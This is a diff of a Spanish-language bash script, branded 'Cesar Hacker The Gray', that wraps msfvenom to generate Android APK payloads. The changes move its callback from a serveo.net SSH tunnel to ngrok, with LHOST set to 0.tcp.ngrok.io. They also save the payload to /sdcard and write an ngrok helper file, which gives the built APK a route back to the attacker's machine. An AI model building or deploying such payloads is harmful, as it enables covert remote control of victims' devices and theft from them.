@@ -9,15 +9,34 @@ trap ctrl_c 2
         C='\033[1;36m'
         W='\033[0m'
 	clear
-printf "$M"
-	echo "     ____   _  __   ___     ___    _    ____"
-	echo "    |  _ \ / \ \ \ / / |   / _ \  / \  |  _ "
-	echo "    | |_) / _ \ \ V /| |  | | | |/ _ \ | | | |"
-	echo "    |  __/ ___ \ | | | |__| |_| / ___ \| |_| |"
-	echo "    |_| /_/   \_\_ | |_____\___/_/   \_\____/"
+	echo
+	echo "  +-------------------------------------------------------+"
+printf       "$C  |               $Y Cesar Hacker The Gray $C                 |"
+	echo "  +---------------------------+---------------------------+"
+	echo "  |      __________________   |                           |"
+	echo "  |  ==c(______(o(______(_()  | |------------|======[***  |"
+	echo "  |             )=\           | |  EXPLOIT   \            |"
+	echo "  |            // \\           | |_____________\_______    |"
+	echo "  |           //   \\          | |==[msf >]============\   |"
+	echo "  |          //     \\         | |______________________\  |"
+	echo "  |         // RECON \\        | \(@)(@)(@)(@)(@)(@)(@)/   |"
+	echo "  |        //         \\       |  *********************    |"
+	echo "  +---------------------------+---------------------------+"
+	echo "  |      o O o                |        \ \/\/\/ /         |"
+	echo "  |              o O          |         )======(          |"
+	echo "  |                 o         |       .'  LOOT            |"
+	echo "  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |"
+	echo "  | |    PAYLOAD     |  \___  |     /    (_||_     \      |"
+	echo "  | |________________|__|)__| |    |     __||_)     |     |"
+	echo "  | |(@)(@)   **|(@)(@)**|(@) |            ||             |"
+	echo "  |  = = = = = = = = = = = =  |     '--------------'      |"
+	echo "  +---------------------------+---------------------------+"
+
 printf "$Y       V 0.2.1       $G Cesar Hacker The Gray"
 echo
-printf "$C [Cesar]$R Bamos a crear nuestro payload$W"                                                                                           printf "$C [Set]$R PAYLOAD$Y"                                                   while read -p " >> " PAYLOAD && [ -z $PAYLOAD ];              	 printf "\n $B
+printf "$C [Cesar]$R Bamos a crear nuestro payload$W"   
+
+printf "$C [Set]$R PAYLOAD$Y"                                                   while read -p " >> " PAYLOAD && [ -z $PAYLOAD ];              	 printf "\n $B
  [Gray] Beamos los requisitos 
                 $W \n"
 
@@ -27,15 +46,21 @@ printf "$C [Cesar]$R Bamos a crear nuestro payload$W"                           
                 printf "\n $R
                 [Gray] porfavor pon un IP [HOST]
                 $W \n"
-        done
+	done
 
-printf "$C [Set]$Y LOCAL PORT$G"
-        while read -p " >> " LPORT && [ -z $LPORT ]; do
+printf "$C [Set]$Y https, http, tcp..$G"
+        while read -p " >> " Gray && [ -z $Gray ]; do
                 printf "\n $R
-                [Gray] porfavor pon un puerto [LPORT]
+                [Gray] porfavor el tipo de payload
                 $W \n"
-        done
+        done                         
 
+	sleep 2
+	echo
+printf "$C porfavor pega esto en otra ventana $Y( ngrok $Gray Puerto )"
+	echo
+	echo
+	sleep 1
 printf "$C [Set]$Y nombre$G"
         while read -p " >> " MYAPK && [ -z $MYAPK ]; do
                 printf "\n $R
@@ -54,7 +79,7 @@ printf "$C [Set]$Y PAYLOAD$G"
 
 sleep 1
 
-printf "$C [Set]$Y Puerto 5 dijitos$G"
+printf "$C [Set]$Y Puerto de ngrok$G"
         while read -p " >> " SSH && [ -z $SSH ]; do                          printf "\n $R                                                           [Gray] porfavor pon un puerto de 5 dijitos   
 	$W \n" 
         
@@ -74,13 +99,15 @@ printf "$C"
 	echo "|_| |_| |_|___/_|   \_/ \___|_| |_|\___/|_| |_| |_|"
 printf "$Y        Cesar Hacker The Gray"
 echo
-printf "$C Pega esto en otra ventana ( ssh -R $LPORT:$LHOST:$SSH serveo.net)"
+printf "$C ojo tiene que estar activo ( ngrok $Gray puerto )"
 echo
+mkdir -p $HOME/Red/SSH
+echo 
 echo
 mkdir -p /sdcard/PAYLOAD
 printf "$G"
 
-msfvenom -p $PAYLOAD LHOST=serveo.net LPORT=$SSH R > /sdcard/PAYLOAD/$MYAPK
+msfvenom -p $PAYLOAD LHOST=0.tcp.ngrok.io LPORT=$SSH R > /sdcard/PAYLOAD/$MYAPK
 
 
 
@@ -102,6 +129,12 @@ printf "$C [Set]$G LOCAL PORT$Y"
                         printf "\n $R                                                           [Gra] porfavor coloca un puerto
                         $W \n"
 		done
+
+echo
+        touch $HOME/Red/SSH/$MYAPK.rc
+        echo "ngrok $Gray $LPORT" >> $HOME/Red/SSH/$MYAPK.rc
+chmod +x $HOME/Red/SSH/$MYAPK.rc
+echo
 printf "                $C Press$Y enter$C to continue$W"
         read enter
 		clear
